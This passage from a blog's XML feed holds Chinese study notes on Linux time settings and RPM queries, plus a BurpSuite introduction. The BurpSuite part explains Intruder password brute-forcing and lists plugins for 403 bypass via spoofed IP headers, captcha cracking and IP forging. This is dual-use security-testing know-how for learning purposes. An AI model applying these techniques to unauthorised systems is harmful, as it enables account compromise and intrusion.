src="http://120.48.107.243:9090/blog/2023/04/03/3a190d132b90403f9bd5b8e3ad5bb6da.png" alt="在这里插入图片描述"><br>例3：显示时区</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/fef97974cb9d49abbafb77164149105a.png" alt="在这里插入图片描述"></p><h2 id="2、hwclock-x2F-clock"><a href="#2、hwclock-x2F-clock" class="headerlink" title="2、hwclock&#x2F;clock"></a>2、hwclock&#x2F;clock</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">语法格式：hwclock [--adjust][--debug][--directisa][--hctosys][--show][--systohc][--test]</span><br><span class="line">[--utc][--version][--set --date=<span class="tag">&lt;<span class="name">日期与时间</span>&gt;</span>]</span><br><span class="line">参数：</span><br><span class="line">--adjust hwclock 每次更改硬件时钟时，都会记录在/etc/adjtime 文件中。使用--adjust 参数，可使 hwclock</span><br><span class="line">根据先前的记录来估算硬件时钟的偏差，并用来校正目前的硬件时钟。</span><br><span class="line">--debug 显示 hwclock 执行时详细的信息。</span><br><span class="line">--directisa hwclock 预设从/dev/rtc 设备来存取硬件时钟。若无法存取时，可用此参数直接以 I/O 指令</span><br><span class="line">来存取硬件时钟。</span><br><span class="line">--hctosys 将系统时钟调整为与目前的硬件时钟一致。</span><br><span class="line">--set --date=<span class="tag">&lt;<span class="name">日期与时间</span>&gt;</span> 设定硬件时钟。</span><br><span class="line">--show 显示硬件时钟的时间与日期。</span><br><span class="line">--systohc 将硬件时钟调整为与目前的系统时钟一致。</span><br><span class="line">--test 仅测试程序，而不会实际更改硬件时钟。</span><br><span class="line">--utc 若要使用格林威治时间，请加入此参数，hwclock 会执行转换的工作。</span><br><span class="line">--version 显示版本信息。</span><br></pre></td></tr></table></figure><p>例1：查看硬件时间<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7fe5f972ef3b474597f441789f7e952c.png" alt="在这里插入图片描述"><br>例2：设置硬件时间<br><img src="http://120.48.107.243:9090/blog/2023/04/03/948a41a25f7446efa529a15e935dac36.png" alt="在这里插入图片描述"><br>例3：硬件时间和系统时间同步</p><p>hwclock –hctosys</p><h2 id="3、时区的设置"><a href="#3、时区的设置" class="headerlink" title="3、时区的设置"></a>3、时区的设置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># tzselect</span><br><span class="line">Please identify a location so that time zone rules can be set correctly.</span><br><span class="line">Please select a continent or ocean.</span><br><span class="line">1) Africa</span><br><span class="line">2) Americas</span><br><span class="line">3) Antarctica</span><br><span class="line">4) Arctic Ocean</span><br><span class="line">5) Asia</span><br><span class="line">6) Atlantic Ocean</span><br><span class="line">7) Australia</span><br><span class="line">8) Europe</span><br><span class="line">9) Indian Ocean</span><br><span class="line">10) Pacific Ocean</span><br><span class="line">11) none - I want to specify the time zone using the Posix TZ format.</span><br><span class="line">#? 输入 5，亚洲</span><br><span class="line">Please select a country.</span><br><span class="line">1) Afghanistan 18) Israel 35) Palestine</span><br><span class="line">2) Armenia 19) Japan 36) Philippines</span><br><span class="line">3) Azerbaijan 20) Jordan 37) Qatar</span><br><span class="line">4) Bahrain 21) Kazakhstan 38) Russia</span><br><span class="line">5) Bangladesh 22) Korea (North) 39) Saudi Arabia</span><br><span class="line">6) Bhutan 23) Korea (South) 40) Singapore</span><br><span class="line">7) Brunei 24) Kuwait 41) Sri Lanka</span><br><span class="line">8) Cambodia 25) Kyrgyzstan 42) Syria</span><br><span class="line">9) China 26) Laos 43) Taiwan</span><br><span class="line">10) Cyprus 27) Lebanon 44) Tajikistan</span><br><span class="line">11) East Timor 28) Macau 45) Thailand</span><br><span class="line">12) Georgia 29) Malaysia 46) Turkmenistan</span><br><span class="line">13) Hong Kong 30) Mongolia 47) United Arab Emirates</span><br><span class="line">14) India 31) Myanmar (Burma) 48) Uzbekistan</span><br><span class="line">15) Indonesia 32) Nepal 49) Vietnam</span><br><span class="line">16) Iran 33) Oman 50) Yemen</span><br><span class="line">17) Iraq 34) Pakistan</span><br><span class="line">#? 输入 9，中国</span><br><span class="line">Please select one of the following time zone regions.</span><br><span class="line">1) east China - Beijing, Guangdong, Shanghai, etc.</span><br><span class="line">2) Heilongjiang</span><br><span class="line">3) central China - Gansu, Guizhou, Sichuan, Yunnan, etc.</span><br><span class="line">4) Tibet &amp; most of Xinjiang Uyghur</span><br><span class="line">5) southwest Xinjiang Uyghur</span><br><span class="line">#? 输入 1，北京时间</span><br><span class="line">The following information has been given:</span><br><span class="line">China</span><br><span class="line">east China - Beijing, Guangdong, Shanghai, etc.</span><br><span class="line">Therefore TZ=&#x27;Asia/Shanghai&#x27; will be used.</span><br><span class="line">Local time is now: Fri Jul 7 10:32:18 CST 2006.</span><br><span class="line">Universal Time is now: Fri Jul 7 02:32:18 UTC 2006.</span><br><span class="line">Is the above information OK?</span><br><span class="line">1) Yes</span><br><span class="line">2) No</span><br><span class="line">#? 输入 1，确认</span><br><span class="line">如果不用 tzselect 命令，可以修改文件变更时区。</span><br><span class="line"># vi /etc/sysconfig/clock</span><br><span class="line">Z/Shanghai（查/usr/share/zoneinfo 下面的文件）</span><br><span class="line">UTC=false</span><br><span class="line">ARC=false</span><br><span class="line"># rm /etc/localtime</span><br><span class="line"># ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">重新启动即可。</span><br></pre></td></tr></table></figure><h2 id="4、图形界面设置时区命令"><a href="#4、图形界面设置时区命令" class="headerlink" title="4、图形界面设置时区命令"></a>4、图形界面设置时区命令</h2><p>timeconfig</p><h2 id="5、时间同步"><a href="#5、时间同步" class="headerlink" title="5、时间同步"></a>5、时间同步</h2><p>例1：同步时间</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ntpdate 210.72.145.44 （210.72.145.44 是中国国家授时中心的官方服务器）</span><br></pre></td></tr></table></figure><p>例2：定时同步时间</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># crontab –e 添加脚本例子如下：</span><br><span class="line">*/20 * * * * /usr/sbin/ntpdate 210.72.145.44 //每 20 分钟执行一次</span><br><span class="line">30 5 * * * /usr/sbin/ntpdate 210.72.145.44 //每天早晨 5 点半执行</span><br><span class="line">※ 前面五个*号代表五个数字，数字的取值范围和含义如下：分钟（0-59） 小時（0-23） 日期（1-31）</span><br><span class="line">月份（1-12） 星期（0-6）//0 代表星期天设定完毕后，可使用# crontab –l 查看上面的设定。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite工具的学习与使用</title>
      <link href="/2021/10/20/bp_tool_use/"/>
      <url>/2021/10/20/bp_tool_use/</url>
      
        <content type="html"><![CDATA[<h1 id="一、软件简介"><a href="#一、软件简介" class="headerlink" title="一、软件简介"></a>一、软件简介</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><h2 id="2、工作原理"><a href="#2、工作原理" class="headerlink" title="2、工作原理"></a>2、工作原理</h2><p>Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务端的返回信息等。Burp Suite主要拦截http和https协议的流量，通过拦截，Burp Suite以中间人的方式，可以对客户端请求数据、服务端返回做各种处理，以达到安全评估测试的目的。</p><h1 id="二、软件界面"><a href="#二、软件界面" class="headerlink" title="二、软件界面"></a>二、软件界面</h1><h2 id="1、主视图"><a href="#1、主视图" class="headerlink" title="1、主视图"></a>1、主视图</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/7bceb5fd520a47ce9fa8f7d9a78c0734.png" alt="在这里插入图片描述"></p><h2 id="2、Dashboard（仪表盘）"><a href="#2、Dashboard（仪表盘）" class="headerlink" title="2、Dashboard（仪表盘）"></a>2、Dashboard（仪表盘）</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/de58058804b5403e852a3d0473fbab30.png" alt="在这里插入图片描述"></p><h3 id="（1）任务"><a href="#（1）任务" class="headerlink" title="（1）任务"></a>（1）任务</h3><p>这里是所进行的任务，主动扫描、被动扫描，默认有两个。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/9bf00770a69842399664ce34eff8c3d4.png" alt="在这里插入图片描述"></p><h3 id="（2）问题活动"><a href="#（2）问题活动" class="headerlink" title="（2）问题活动"></a>（2）问题活动</h3><p>此处是经过扫描后出现的问题活动，包括ID、任务、时间、行动、问题类型以及主机。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/22d5e9ff83cb439199c4b8e3b2c4ee26.png" alt="在这里插入图片描述"></p><h3 id="（3）事件日志"><a href="#（3）事件日志" class="headerlink" title="（3）事件日志"></a>（3）事件日志</h3><p>此处显示扫描过后的所有事件。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/30536bf4b4f24774a42ecea23f84afdd.png" alt="在这里插入图片描述"></p><h3 id="（4）详细信息"><a href="#（4）详细信息" class="headerlink" title="（4）详细信息"></a>（4）详细信息</h3><p>点击问题活动中的条例，此处会显示详细信息。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/0998cfce894d48a9b8c5c02868e473a7.png" alt="在这里插入图片描述"></p><h2 id="2、Target（目标）"><a href="#2、Target（目标）" class="headerlink" title="2、Target（目标）"></a>2、Target（目标）</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/6e5fe7a24197402ab3538a065cef1f20.png" alt="在这里插入图片描述"></p><h3 id="（1）Site-map"><a href="#（1）Site-map" class="headerlink" title="（1）Site map"></a>（1）Site map</h3><p>此页面显示所有经过软件的流量，左侧为列表，以列表形式返回，返回目录，灰色为软件未请求。选中黑色的右侧即可显示详细信息，中间可以看到请求包和响应包、内容，右侧是问题。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/0176fb85ec544f24a98befc2a39d7991.png" alt="在这里插入图片描述"></p><h3 id="（2）Scope"><a href="#（2）Scope" class="headerlink" title="（2）Scope"></a>（2）Scope</h3><p>目标范围，可以设置你想看到的一些信息，比如只看一个网站的信息。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/be3c0fefda754e8abdd2aaedcc1e58c9.png" alt="在这里插入图片描述"></p><h3 id="（3）Issue-definitions"><a href="#（3）Issue-definitions" class="headerlink" title="（3）Issue definitions"></a>（3）Issue definitions</h3><p>这里是一些问题定义，单击左侧列表可以在右侧看到详细信息，这里是软件可以扫描到的漏洞。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/323d608ebd594e5180aa3fa4c1bb5a8e.png" alt="在这里插入图片描述"></p><h2 id="3、Proxy（代理）"><a href="#3、Proxy（代理）" class="headerlink" title="3、Proxy（代理）"></a>3、Proxy（代理）</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/aa95ac0e9279478ab18ced9fa03da971.png" alt="在这里插入图片描述"></p><h3 id="（1）Intercept"><a href="#（1）Intercept" class="headerlink" title="（1）Intercept"></a>（1）Intercept</h3><p>注意：需要提前配置浏览器（挂代理和安装证书）。这里开启拦截即可拦截到浏览器的请求包和响应包，右边是详细信息，右键可以发送到其他模块以及其他设置，发送丢弃行动可以进行相关操作，open browser可以打开内置浏览器，内置浏览器可以直接拦截不需要设置代理和证书。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/7070590ecec14bcf8b64e05e231ae2f4.png" alt="在这里插入图片描述"></p><h3 id="（2）HTTP-history"><a href="#（2）HTTP-history" class="headerlink" title="（2）HTTP history"></a>（2）HTTP history</h3><p>这里存放着所有的请求历史，点击后，下方会显示详细信息。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/a44f53802ab0449da78e347901761a71.png" alt="在这里插入图片描述"></p><h3 id="（3）WebSockets-history"><a href="#（3）WebSockets-history" class="headerlink" title="（3）WebSockets history"></a>（3）WebSockets history</h3><p>这个一般都是空的，抓的是原始请求信息。</p><h3 id="（4）Options"><a href="#（4）Options" class="headerlink" title="（4）Options"></a>（4）Options</h3><p>可以设置代理监听器（可以设置端口），拦截客户端请求（可以添加规则），服务器响应拦截等相关设置，注意和浏览器代理配合。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/877c43f943094f6d86c4ed258d39a709.png" alt="在这里插入图片描述"></p><h2 id="4、Intruder（入侵）"><a href="#4、Intruder（入侵）" class="headerlink" title="4、Intruder（入侵）"></a>4、Intruder（入侵）</h2><p>代理拦截到的网址后台可以发送到此页面，选中账号密码添加变量，选择四种方式的一种，在payloads中可以配置字典，然后可以开始爆破。<br>在资源池（Resource Pool）中，可以设置并发数，注意并发数不要太大。<br>Option中，有请求标头，网络重试次数，攻击结果等设置。</p><h2 id="5、Repeater（重放）"><a href="#5、Repeater（重放）" class="headerlink" title="5、Repeater（重放）"></a>5、Repeater（重放）</h2><p>在这里是让我们进行手工操作的，不需要一直去抓包改包发包，这里可以实时显示，可以节省操作时间，在前面抓到包后右键发送到这里。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/247641ff7ba44ecba3805ad8fd7cd7d0-20230401144520157.png" alt="在这里插入图片描述"></p><h2 id="6、Sequencer（序列器）"><a href="#6、Sequencer（序列器）" class="headerlink" title="6、Sequencer（序列器）"></a>6、Sequencer（序列器）</h2><p>这是一种用于分析数据样本随机性质量的工具。可以用它测试程序的会话令牌，密码重置令牌是否可预测等场景，通过它的数据样本分析，能够很好的降低这些关键数据被伪造的风险。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/e21307cfdb4d4fe5be191ffefff75202.png" alt="在这里插入图片描述"></p><h2 id="7、Decoder（解码器）"><a href="#7、Decoder（解码器）" class="headerlink" title="7、Decoder（解码器）"></a>7、Decoder（解码器）</h2><p>解码器是一个进行手动执行或对应用程序数据者智能解码编码的工具，此功能可用于解码数据找回原来的数据形式，或者进行编码和数据加密。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/78bb45cdaa4d4615845f5b0903b223e6.png" alt="在这里插入图片描述"></p><h2 id="8、Comparper（对比）"><a href="#8、Comparper（对比）" class="headerlink" title="8、Comparper（对比）"></a>8、Comparper（对比）</h2><p>在这里可以在前面抓取的包右键发送到这里，也可以直接粘贴，可以对比字节，对比数据内有什么不同，去比较，可以选择任意比较，相同或者不同的地方一目了然。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/f4f048c12427429f966751b532ea2376.png" alt="在这里插入图片描述"></p><h2 id="9、Logger（日志）"><a href="#9、Logger（日志）" class="headerlink" title="9、Logger（日志）"></a>9、Logger（日志）</h2><p>在这里，顾名思义，这里面会显示抓取到的所有请求，包括爆破的包。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/09bc2333b563464ab95797b56dc35eae.png" alt="在这里插入图片描述"></p><h2 id="10、Extender（扩展）"><a href="#10、Extender（扩展）" class="headerlink" title="10、Extender（扩展）"></a>10、Extender（扩展）</h2><h3 id="（1）Extensions"><a href="#（1）Extensions" class="headerlink" title="（1）Extensions"></a>（1）Extensions</h3><p>在这里可以添加很多插件，武装我们的软件，随心所欲加第三方插件，支持java，python和ruby。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/c076ad94f8a84c5eb4e50231afd7fb15.png" alt="在这里插入图片描述"></p><h3 id="（2）BApp-Store"><a href="#（2）BApp-Store" class="headerlink" title="（2）BApp Store"></a>（2）BApp Store</h3><p>这里是自带插件商店，有需要可以在这里下载。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/0e4c7f2e329f4333b85adfa661d83ea7.png" alt="在这里插入图片描述"></p><h3 id="（3）APIs"><a href="#（3）APIs" class="headerlink" title="（3）APIs"></a>（3）APIs</h3><p>设置调用的API。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/b0470bb90e77470783790362b083464b.png" alt="在这里插入图片描述"></p><h3 id="（4）Options-1"><a href="#（4）Options-1" class="headerlink" title="（4）Options"></a>（4）Options</h3><p>这里配置环境，如果实现python，要加入jython。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/693390c470f04187a449123c2a79356a.png" alt="在这里插入图片描述"></p><h2 id="11、Project-options（全局设置）"><a href="#11、Project-options（全局设置）" class="headerlink" title="11、Project options（全局设置）"></a>11、Project options（全局设置）</h2><p>整个软件的所有设置都会改掉，不推荐更改，建议在用户设置更改。</p><h2 id="12、User-options（用户设置）"><a href="#12、User-options（用户设置）" class="headerlink" title="12、User options（用户设置）"></a>12、User options（用户设置）</h2><h3 id="（1）Connections"><a href="#（1）Connections" class="headerlink" title="（1）Connections"></a>（1）Connections</h3><p>可以添加认证，给软件添加代理以及socks代理。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/2c6b12d7989d4e0187282747e5a53ac4.png" alt="在这里插入图片描述"></p><h3 id="（2）TLS"><a href="#（2）TLS" class="headerlink" title="（2）TLS"></a>（2）TLS</h3><p>这里基本不动他。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/6d9ab514790044c794fbefac81ef9f37.png" alt="在这里插入图片描述"></p><h3 id="（3）Display"><a href="#（3）Display" class="headerlink" title="（3）Display"></a>（3）Display</h3><p>如果遇到鼠标光标不对或者乱码，可以在这里更改。可以改字体大小，主题，字体。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/4e61e959a8be412684e7220719cbc813.png" alt="在这里插入图片描述"></p><h3 id="（4）Misc"><a href="#（4）Misc" class="headerlink" title="（4）Misc"></a>（4）Misc</h3><p>这里是热键设置，自动备份设置以及临时文件位置等设置。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/17125d30b027438f8f5c3de2176e47e8.png" alt="在这里插入图片描述"></p><h1 id="三、相关扩展"><a href="#三、相关扩展" class="headerlink" title="三、相关扩展"></a>三、相关扩展</h1><table><thead><tr><th align="left">有关burpsuite的插件</th><th><a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a></th><th>BurpSuite-collections</th></tr></thead><tbody><tr><td align="left">一款基于BurpSuite的被动式shiro检测插件</td><td><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a></td><td>BurpShiroPassiveScan</td></tr><tr><td align="left">一款基于BurpSuite的被动式FastJson检测插件</td><td><a href="https://github.com/pmiaowu/BurpFastJsonScan">https://github.com/pmiaowu/BurpFastJsonScan</a></td><td>BurpFastJsonScan</td></tr><tr><td align="left">APIKit是基于BurpSuite提供的JavaAPI开发的插件</td><td><a href="https://github.com/API-Security/APIKit">https://github.com/API-Security/APIKit</a></td><td>APIKit</td></tr><tr><td align="left">domain_hunter_pro 一个资产管理类的Burp插件</td><td><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></td><td>domain_hunter_pro</td></tr><tr><td align="left">新一代子域名主&#x2F;被动收集工具</td><td><a href="https://github.com/Acmesec/Sylas">https://github.com/Acmesec/Sylas</a></td><td>Sylas</td></tr><tr><td align="left">GadgetProbe Burp插件 用来爆破远程类查找Java反序列化</td><td><a href="https://github.com/BishopFox/GadgetProbe">https://github.com/BishopFox/GadgetProbe</a></td><td>GadgetProbe</td></tr><tr><td align="left">HopLa 自动补全 Payload 的 BurpSuite插件</td><td><a href="https://github.com/synacktiv/HopLa">https://github.com/synacktiv/HopLa</a></td><td>HopLa</td></tr><tr><td align="left">验证码识别</td><td><a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></td><td>captcha-killer-modified</td></tr><tr><td align="left">一款支持多种加密算法、或直接执行浏览器JS代码的BurpSuite插件。</td><td><a href="https://github.com/whwlsfb/BurpCrypto">https://github.com/whwlsfb/BurpCrypto</a></td><td>BurpCrypto</td></tr><tr><td align="left">根据自定义来达到对数据包的处理（适用于加解密、爆破等），类似mitmproxy，不同点在于经过了burp中转</td><td><a href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a></td><td>autoDecoder</td></tr><tr><td align="left">伪造ip地址</td><td><a href="https://github.com/TheKingOfDuck/burpFakeIP">https://github.com/TheKingOfDuck/burpFakeIP</a></td><td>burpFakeIP</td></tr><tr><td align="left">自动发送请求</td><td><a href="https://github.com/nccgroup/AutoRepeater">https://github.com/nccgroup/AutoRepeater</a></td><td>AutoRepeater</td></tr><tr><td align="left">自动探测请求走私漏洞</td><td><a href="https://github.com/portswigger/http-request-smuggler">https://github.com/portswigger/http-request-smuggler</a></td><td>http-request-smuggler</td></tr><tr><td align="left">Unicode 转中⽂</td><td><a href="https://github.com/bit4woo/U2C">https://github.com/bit4woo/U2C</a></td><td>U2C</td></tr><tr><td align="left">用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包</td><td><a href="https://github.com/ScriptKid-Beta/Unexpected_information">https://github.com/ScriptKid-Beta/Unexpected_information</a></td><td>Unexpected_information</td></tr><tr><td align="left">bypass403⻚⾯的，举个例⼦，⽐如我们有时候看到很多⽹站限制外部访问，访问的话直接显示403，我们可能改⼀个IP头为本地127.0.0.1我们就能绕过这个限制，这个插件可以全⾃动的来帮我们验证。</td><td><a href="https://github.com/sting8k/BurpSuite_403Bypasser">https://github.com/sting8k/BurpSuite_403Bypasser</a></td><td>403Bypasser</td></tr></tbody></table><h1 id="四、总结与后记"><a href="#四、总结与后记" class="headerlink" title="四、总结与后记"></a>四、总结与后记</h1><p>可以看得出我学的东西比较杂，当然大部分东西都是感兴趣而学，有什么意见和建议请评论，感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（六）软件安装</title>
      <link href="/2021/10/20/linux_study_six/"/>
      <url>/2021/10/20/linux_study_six/</url>
      
        <content type="html"><![CDATA[<h1 id="一、RPM"><a href="#一、RPM" class="headerlink" title="一、RPM"></a>一、RPM</h1><p>ROM软件的安装、删除、更新只有root权限才能使用，对于查询功能任何用户都可以操作，如果普通用户拥有安装目录的权限，也可以进行安装，首先初始化rpm数据库，通过rpm命令查询一个rpm包是否安装了，也是要通过rpm数据库来完成的，所以我们要经常用下面的两个命令来初始化rpm数据库：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]<span class="meta"># rpm --initdb</span></span><br><span class="line">[root@localhost]<span class="meta"># rpm --rebuilddb </span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;注意：这两个参数是极为有用的，有时候RPM系统出来问题，不能安装和查询，大多是这里出了问题。&#x2F;var&#x2F;lib&#x2F;rpm目录下的数据库记录所有软件的升级需求，记录已经安装的所有软件，数字证书记录等，这个目录下的文件非常重要。&#x3D;&#x3D;</p><h2 id="1、RPM软件包管理的查询功能"><a href="#1、RPM软件包管理的查询功能" class="headerlink" title="1、RPM软件包管理的查询功能"></a>1、RPM软件包管理的查询功能</h2><p>命令格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm &#123;-q|--query&#125; [select-options] [query-options]</span><br></pre></td></tr></table></figure><p><strong>RPM的查询功能极为强大，是极为重要的功能之一。</strong></p><h3 id="（1）查询系统已经安装的软件"><a href="#（1）查询系统已经安装的软件" class="headerlink" title="（1）查询系统已经安装的软件"></a>（1）查询系统已经安装的软件</h3><p>语法：rpm -q 软件名<br>举例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -q python</span><br><span class="line">package python is not installed</span><br></pre></td></tr></table></figure><p>此命令表示的是，系统是否安装了python，如果已经安装会有信息输出，如果没有安装，会输出gaim没有安装的信息。<br>查看系统中所有已经安装的包，要加-a参数：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qa</span><br><span class="line">lshw-B.02.18-23.el8.x86_64</span><br><span class="line">grubby-8.40-38.el8.x86_64</span><br><span class="line">geolite2-country-20180605-1.el8.noarch</span><br><span class="line">iprutils-2.4.18.1-1.el8.x86_64</span><br><span class="line">glib2-2.56.4-8.el8.x86_64</span><br><span class="line">python3-pip-wheel-9.0.3-16.el8.noarch</span><br><span class="line">lsscsi-0.30-1.el8.x86_64</span><br><span class="line">centos-gpg-keys-8.2-2.2004.0.1.el8.noarch</span><br><span class="line">langpacks-en-1.0-12.el8.noarch</span><br></pre></td></tr></table></figure><p>在所有已经安装的软件包中查找某个软件，比如说python，可以用grep抽取出来。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qa | grep python</span><br><span class="line">python3-pip-wheel-9.0.3-16.el8.noarch</span><br><span class="line">python3-gobject-base-3.28.3-1.el8.x86_64</span><br><span class="line">python3-libxml2-2.9.7-7.el8.x86_64</span><br><span class="line">python3-libdnf-0.63.0-3.el8.x86_64</span><br></pre></td></tr></table></figure><h3 id="（2）查询一个已经安装的文件属于哪个软件包"><a href="#（2）查询一个已经安装的文件属于哪个软件包" class="headerlink" title="（2）查询一个已经安装的文件属于哪个软件包"></a>（2）查询一个已经安装的文件属于哪个软件包</h3><p>语法：rpm -qf 文件名 &#x3D;&#x3D;注：文件名所在的绝对路径要指出举例。&#x3D;&#x3D;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qf /usr/lib/libacl.la</span><br><span class="line">error: file /usr/lib/libacl.la: No such file or directory</span><br></pre></td></tr></table></figure><p>如果没有这个软件包的话就会提示没有。</p><h3 id="（3）查询已安装软件包都安装到何处"><a href="#（3）查询已安装软件包都安装到何处" class="headerlink" title="（3）查询已安装软件包都安装到何处"></a>（3）查询已安装软件包都安装到何处</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：rpm -ql 软件名 或 rpm rpmquery -ql 软件名</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -ql lynx</span><br><span class="line">[root@Kelemao /]# rpmquery -ql lynx</span><br></pre></td></tr></table></figure><h3 id="（4）查询一个已安装软件包的信息"><a href="#（4）查询一个已安装软件包的信息" class="headerlink" title="（4）查询一个已安装软件包的信息"></a>（4）查询一个已安装软件包的信息</h3><p>语法格式：rpm -qi软件名<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qi lynx</span><br></pre></td></tr></table></figure><h3 id="（5）查看一下已安装软件的配置文件"><a href="#（5）查看一下已安装软件的配置文件" class="headerlink" title="（5）查看一下已安装软件的配置文件"></a>（5）查看一下已安装软件的配置文件</h3><p>语法格式：rpm -qc 软件名<br>举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Kelemao /]# rpm -qc 